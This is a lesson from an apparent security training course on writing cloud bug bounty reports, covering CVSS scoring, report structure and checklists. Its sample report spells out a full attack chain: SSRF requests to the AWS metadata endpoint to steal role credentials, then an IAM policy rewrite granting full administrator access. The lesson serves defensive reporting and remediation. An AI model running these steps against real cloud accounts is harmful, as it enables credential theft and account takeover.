---
title: "Cloud Practice — Report Writing Sprint"
tags: [cloud-practice, report-writing, bug-bounty, finding-format, CVSS, impact,
       remediation, evidence, triage, communication, AWS, ATT&CK]
module: 04-BroadSurface-02
day: 209
related_topics:
  - Cloud Bug Bounty Mock Engagement (Day 208)
  - Cloud Security Review (Day 196)
  - Cloud Competency Check (Day 210)
  - Web Bug Bounty Report Writing (Day 72)
---

# Day 209 — Cloud Practice: Report Writing Sprint

> "A vulnerability nobody acts on is a vulnerability that stays open. The
> exploit is yours for thirty seconds. The report is what lives in the
> programme's database forever — it determines whether they fix it, whether
> they pay you, and whether they trust the next report you submit. You are not
> done when you find the bug. You are done when the report is good enough that
> a developer who has never heard of SSRF can follow your steps, reproduce the
> issue, and ship the fix without asking you a single question."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Produced a polished, publication-quality report for the highest-severity
   finding from Day 208.
2. Written a complete finding for every other confirmed vulnerability from Day 208.
3. Calibrated your CVSS scoring against the ATT&CK technique mapping.
4. Built a reusable personal report template.
5. Reviewed a set of real-world finding examples and identified what makes
   them effective.

**Time budget:** 5–6 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Day 208 engagement completed | Day 208 |
| At least 3 confirmed findings documented | Day 208 evidence/ directory |
| CVSS 3.1 scoring familiarity | Day 196 |

---

## Block 1 — What Makes a Good Cloud Security Report (45 min)

Before you write anything, study the anatomy of an effective finding. This is
not about templates — it is about what information a triager needs to act.

### The Triager's Problem

A bug bounty triager receives 50–100 reports per week. They have 3–5 minutes
to assess each one before deciding: duplicate, not a bug, needs more info, or
valid. If your report cannot answer these four questions in the first two
paragraphs, it will not be triaged correctly:

| Question | Where it must appear |
|---|---|
| What can an attacker do? | Title + first sentence of description |
| How hard is this to exploit? | Attack complexity in CVSS + PoC steps |
| What is the blast radius? | Impact section — specific data or access |
| How do I reproduce this? | Steps to reproduce — exact commands |

### Anatomy of a High-Quality Cloud Finding

```
TITLE
  Format: [Vuln class] in [component] allows [impact]
  Good:   "SSRF via /fetch endpoint allows IMDS credential theft and
           IAM privilege escalation to AdministratorAccess"
  Bad:    "SSRF vulnerability found"
  Bad:    "Server-Side Request Forgery"

SEVERITY
  CVSS 3.1 base score with vector string.
  Do NOT write "Critical" without the vector.
  Vector tells the triager exactly what assumptions you are making.

DESCRIPTION — 3 paragraphs
  ¶1: What the vulnerability is and where it exists.
  ¶2: Why it exists (root cause — this helps developers fix it).
  ¶3: What an attacker can achieve and the realistic worst-case scenario.

STEPS TO REPRODUCE
  - Numbered, exact, reproducible.
  - Every command must be copy-pasteable and work on the first try.
  - Include setup assumptions: "Tested with AWS CLI 2.x, jq 1.6, curl 7.74."
  - Show the expected output at each critical step — do not make the triager
    wonder what a successful step looks like.

EVIDENCE
  - Minimum 2 pieces of evidence.
  - For SSRF: the raw HTTP request + response showing IMDS data retrieved.
  - For IAM: the sts:GetCallerIdentity output showing the escalated role.
  - For S3: the s3 ls output from an unauthenticated session.
  - Redact PII if the evidence contains real customer data.

IMPACT
  Specific, quantified where possible.
  Good: "An unauthenticated attacker can retrieve temporary AWS credentials
        for the ec2-app-role, which has iam:CreatePolicyVersion on all
        resources. Using these credentials, the attacker can escalate to
        full AdministratorAccess within 90 seconds."
  Bad:  "This could lead to data exposure."

REMEDIATION
  One specific action, not a list of options.
  Good: "Disable IMDSv1 and enforce IMDSv2 by setting
        `HttpTokens: required` on all EC2 instances via the AWS Console
        or: aws ec2 modify-instance-metadata-options
            --instance-id i-XXXX --http-tokens required"
  Bad:  "Follow AWS security best practices."

REFERENCES
  MITRE ATT&CK technique ID + link.
  CWE number + link.
  Relevant AWS documentation.
```

---

## Block 2 — CVSS 3.1 Scoring for Cloud Findings (45 min)

Cloud vulnerabilities have specific CVSS patterns. Get these right — incorrect
scoring is one of the most common reasons a finding gets downgraded.

### Scoring Reference for Common Cloud Findings

| Vulnerability | AV | AC | PR | UI | S | C | I | A | Score |
|---|---|---|---|---|---|---|---|---|---|
| Unauthenticated public S3 read | N | L | N | N | U | H | N | N | 7.5 High |
| SSRF to IMDS (IMDSv1) | N | L | N | N | C | H | H | N | 9.3 Critical |
| IAM PrivEsc via CreatePolicyVersion | N | L | L | N | C | H | H | H | 9.9 Critical |
| Exposed S3 bucket (write access) | N | L | N | N | U | H | H | N | 9.1 Critical |
| Secrets Manager readable by over-broad role | N | L | L | N | U | H | N | N | 6.5 Medium |
| Missing S3 encryption (no MITM path) | N | H | N | N | U | L | N | N | 3.7 Low |
| Lambda function policy over-permissive | N | L | L | N | U | H | N | N | 6.5 Medium |

**Common mistakes:**

- Setting AC:H when the vulnerability is trivially exploitable (IMDS is AC:L)
- Setting S:U for SSRF to IMDS when the metadata endpoint is in a different
  trust zone from the attacker (correct: S:C — scope is changed)
- Setting PR:N for IAM PrivEsc when you already have valid role credentials
  (correct: PR:L — you have low-privilege access)
- Forgetting A: (Availability) when a misconfiguration allows delete or overwrite

### Scoring Exercise

Score each finding from Day 208 using the CVSS 3.1 calculator
(https://www.first.org/cvss/calculator/3.1). For each one, write:

```
Finding: [title]
CVSS vector: CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Score: X.X [Severity]
Justification for each metric:
  AV: [why Network/Adjacent/Local/Physical]
  AC: [why Low/High]
  PR: [why None/Low/High]
  UI: [why None/Required]
  S: [why Unchanged/Changed]
  C: [why None/Low/High]
  I: [why None/Low/High]
  A: [why None/Low/High]
```

---

## Block 3 — Write the Primary Report (2 hours)

Write the full report for your highest-severity finding from Day 208. This is
the P1. Write it to the standard that would earn a $5,000 payout.

Use the following structure, with the word counts as a guide:

```markdown
# [Finding Title — specific, impact-first]

**Severity:** Critical
**CVSS 3.1:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
**CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
**ATT&CK:** T1552.005 — Unsecured Credentials: Cloud Instance Metadata API

---

## Summary (~100 words)
One paragraph. What is the vulnerability, where is it, what is the worst-case
impact. Write this last — it is the hardest part.

---

## Description (~300 words)
### Root Cause
Explain why the vulnerability exists in this specific application.

### Technical Detail
How the SSRF request is processed, why the IMDS endpoint is reachable, and
what the credentials grant access to.

### Attack Scenario
Walk through the realistic attacker journey from initial discovery to full
account compromise. This is narrative, not bullet points.

---

## Steps to Reproduce

### Prerequisites
- AWS CLI 2.x installed
- curl 7.74+
- jq 1.6+
- Access to the internet (no VPN required)

### Reproduction
1. Send the following request to the SSRF endpoint:
   ```
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
   Expected response: `ec2-app-role`

2. Retrieve the role credentials:
   ```
   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role
   ```
   Expected response: JSON object containing `AccessKeyId`, `SecretAccessKey`,
   `Token`, and `Expiration`.

3. Configure the AWS CLI with the stolen credentials:
   ```bash
   export AWS_ACCESS_KEY_ID="ASIA..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   ```

4. Confirm identity:
   ```bash
   aws sts get-caller-identity
   ```
   Expected: ARN shows `assumed-role/ec2-app-role/...`

5. Verify the escalation path — list IAM policies:
   ```bash
   aws iam list-attached-role-policies --role-name ec2-app-role
   ```
   Expected: policy `NimbusAppPolicy` with `iam:CreatePolicyVersion` permission.

6. Escalate to AdministratorAccess:
   ```bash
   aws iam create-policy-version \
     --policy-arn arn:aws:iam::000000000000:policy/NimbusAppPolicy \
     --policy-document '{"Version":"2012-10-17","Statement":[
       {"Effect":"Allow","Action":"*","Resource":"*"}]}' \
     --set-as-default
   ```

7. Confirm admin access:
   ```bash
   aws iam list-users
   ```
   Expected: all IAM users returned, confirming AdministratorAccess.

---

## Evidence

### Evidence 1 — SSRF Response (IMDS Credentials)
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role
Host: localhost:8080

HTTP/1.1 200 OK
Content-Type: application/json

{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "[redacted]",
  "Token": "[redacted]",
  "Expiration": "2024-01-15T10:30:00Z"
}
```

### Evidence 2 — CallerIdentity Confirmation
```
{
  "UserId": "AROAEXAMPLEID:i-0123456789abcdef0",
  "Account": "000000000000",
  "Arn": "arn:aws:sts::000000000000:assumed-role/ec2-app-role/i-0123456789abcdef0"
}
```

### Evidence 3 — Post-Escalation IAM Access
[Screenshot or output of aws iam list-users returning all users]

---

## Impact

An unauthenticated external attacker can:
1. Retrieve temporary AWS credentials via the SSRF vulnerability with zero
   prerequisites — no authentication, no prior access.
2. Use those credentials to enumerate the attached IAM policies, revealing
   the `iam:CreatePolicyVersion` permission.
3. Modify the `NimbusAppPolicy` to grant `*:*` on all resources, achieving
   full AdministratorAccess to the AWS account.
4. From that position: exfiltrate all data from all S3 buckets, read all
   Secrets Manager secrets, create or delete IAM users, terminate EC2 instances,
   or establish persistent backdoor access.

The entire attack chain takes approximately 90 seconds to execute manually
and requires no specialized tooling beyond the AWS CLI.

---

## Remediation

**Immediate (within 24 hours):**
Enforce IMDSv2 (token-required mode) on all EC2 instances:
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id {instance-id} \
  --http-tokens required \
  --http-endpoint enabled
```

**Short-term (within 1 week):**
Remove `iam:CreatePolicyVersion` from the `ec2-app-role` policy. This permission
is not required for the application's function. Apply least-privilege using
the IAM Access Analyzer to identify the minimum required permissions.

**Long-term:**
Implement SSRF protection at the application layer: validate and allowlist
outbound URLs; reject requests to RFC 1918 addresses and the IMDS range
(169.254.169.254/32).

---

## References

- MITRE ATT&CK: [T1552.005 — Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
- CWE: [CWE-918 — Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- AWS: [Defend against SSRF attacks with IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)
- Real-world reference: Capital One breach (2019) — SSRF to IMDS to IAM credential theft
```

---

## Block 4 — Write Secondary Findings (60 min)

For each remaining finding from Day 208 (your P2s and P3s), write a complete
but more concise report. These do not need the full narrative depth of a P1,
but they must still be reproducible and specific.

Minimum required for each secondary finding:
- Title (impact-first format)
- Severity + CVSS vector
- Description (1 paragraph)
- Steps to reproduce (exact commands only — skip prose)
- One piece of evidence
- Remediation (one specific action)

Time budget: 15 minutes per finding.

---

## Block 5 — Self-Review Checklist (30 min)

For each report, apply this checklist before marking it done:

### Completeness
```
[ ] Title follows [Vuln class] in [component] allows [impact] format
[ ] CVSS vector string is present, not just the score
[ ] CWE number is cited
[ ] ATT&CK technique ID is cited
[ ] Description explains the root cause (not just the symptom)
[ ] Steps to reproduce are numbered and use exact commands
[ ] Expected output is shown for at least the critical steps
[ ] At least 2 pieces of evidence are included
[ ] Impact is specific — names data, permissions, or systems at risk
[ ] Remediation is actionable — a developer can execute it today
[ ] References include at least the ATT&CK link and one AWS documentation link
```

### Accuracy
```
[ ] CVSS score matches the vector string (recalculate if unsure)
[ ] Severity label matches the CVSS score:
    9.0–10.0 = Critical, 7.0–8.9 = High, 4.0–6.9 = Medium, 0.1–3.9 = Low
[ ] No claims in the impact section that you have not demonstrated
[ ] Attack path is technically accurate — no logical gaps
```

### Clarity
```
[ ] Title is specific enough that a stranger knows what was found
[ ] First paragraph states the worst-case impact immediately
[ ] A developer unfamiliar with security can understand the description
[ ] Commands are formatted as code blocks, not inline text
[ ] Acronyms are expanded on first use (SSRF, IMDS, IAM, etc.)
```

---

## Block 6 — Build Your Personal Template (30 min)

Create a file `cloud-finding-template.md` in your personal notes. This is your
reusable scaffold. Every time you write a cloud security finding, start from
this template.

The template should contain:
- Front matter with placeholder CVSS fields
- Section headers for all required sections
- Guidance comments (like `<!-- Root cause: explain WHY it exists -->`) that
  you delete after filling in
- A CVSS scoring cheat sheet for the 10 most common cloud vulnerability patterns

A good template saves 30 minutes per finding. Over a year of bug bounty work,
that is hundreds of hours.

---

## Key Takeaways

1. **The report is the product.** The exploit is the proof of concept. The
   report is what the programme buys. A mediocre finding with an excellent
   report gets paid. An excellent finding with a mediocre report gets "more
   info requested" and eventually closed.
2. **Impact framing is a skill, not a description.** "This could lead to data
   exposure" is meaningless. "This exposes 50,000 customer SSNs stored in
   s3://nimbus-financial-exports to any unauthenticated attacker" is a P1.
   The difference is specificity.
3. **CVSS is a communication tool, not a rating system.** The vector string
   tells the triager exactly what conditions the attacker needs. If you get
   the vector wrong, the triager will correct it — and may reassign the
   severity in a direction you do not like.
4. **One specific remediation beats five vague ones.** "Implement least
   privilege" is not a remediation. "Remove `iam:CreatePolicyVersion` from
   the NimbusAppPolicy" is a remediation. Give developers the exact action,
   not the principle.
5. **Write for the developer, not the security team.** The person who will
   fix the vulnerability is a developer who may never have heard of SSRF. Your
   remediation section should be comprehensible to them without a translation
   layer from a security engineer.

---

## Exercises

1. Take the report you wrote for the P1 finding and reduce it to a 3-sentence
   executive summary suitable for a CISO who has 30 seconds to read it. What
   do you keep? What do you cut?

2. Rewrite the "bad" examples from Block 1 (vague titles, vague impact
   statements, vague remediation) for all three findings from Day 208. Compare
   the before/after versions.

3. Research: what is the difference between a CVSS 3.1 base score, temporal
   score, and environmental score? For the SSRF finding, what temporal metrics
   would apply if there is already public PoC exploit code for this exact
   application? How does that change the score?

4. Find three public bug bounty reports on HackerOne Hacktivity that involve
   cloud IAM or SSRF issues. Identify: (a) what makes each report strong or
   weak, (b) how the impact was framed, (c) what the CVSS score was and whether
   you agree with it.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q209.1, Q209.2 …).
> Follow-up questions use hierarchical numbering (Q209.1.1, Q209.1.2 …).

---

## Navigation

← Previous: [Day 208 — Cloud Practice: Mock Bug Bounty Engagement](DAY-0208-Cloud-Practice-Mock-Bug-Bounty.md)
→ Next: [Day 210 — Cloud Security Competency Check](DAY-0210-Cloud-Competency-Check.md)
